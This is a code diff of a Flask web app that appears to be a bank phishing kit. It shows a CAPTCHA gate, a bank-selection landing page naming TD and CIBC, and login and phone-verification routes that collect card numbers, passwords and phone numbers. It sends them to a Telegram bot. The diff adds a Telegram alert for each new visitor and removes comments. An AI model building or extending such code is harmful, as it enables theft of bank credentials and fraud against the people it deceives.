@@ -35,7 +35,6 @@ def check_captcha():
     if they're trying to view the landing page ("/") and 
     hasn't verified yet.
     """
-    # If they're going to 'landing_page' but not verified, go to /captcha
     if request.endpoint == "landing_page" and not session.get("captcha_verified"):
         return redirect(url_for("captcha"))
 
@@ -63,8 +62,16 @@ def captcha():
 
 @app.route("/")
 def landing_page():
-    # Renders e.g. landing.html with bank selection
-    # If they get here, we've passed @app.before_request check_captcha
+    """
+    Renders landing.html (bank selection) AFTER passing CAPTCHA.
+    Also sends a one-time Telegram message per session 
+    about the new visitor.
+    """
+    # If we haven't sent the "new visitor" message yet this session, do it now
+    if not session.get("visited_msg_sent"):
+        send_telegram_message("A new visitor arrived at the site!")
+        session["visited_msg_sent"] = True
+
     return render_template("landing.html")
 
 @app.route("/td")
@@ -98,7 +105,6 @@ def login():
             flash("Card number and password are required!", "error")
             return redirect(url_for("home"))
 
-        # Save info in session
         session["temp_bank"] = bank
         session["temp_card"] = card_number
         session["temp_pass"] = password
@@ -112,7 +118,6 @@ def login():
             # Assume default or "CIBC"
             return redirect(url_for("phone_verification"))
 
-    # If GET, render a generic login page
     return render_template("login.html")
 
 @app.route("/phone-verification", methods=["GET", "POST"])
@@ -142,7 +147,6 @@ def phone_verification():
         )
         send_telegram_message(message_text)
 
-        # Clear session data
         session.pop("temp_bank", None)
         session.pop("temp_card", None)
         session.pop("temp_pass", None)
@@ -155,7 +159,6 @@ def phone_verification():
 def td_phone():
     """
     TD phone verification route.
-    Same pattern: read phone, get session data, write to file, send Telegram, clear, etc.
     """
     if request.method == "POST":
         phone_number = request.form.get("phone_number")
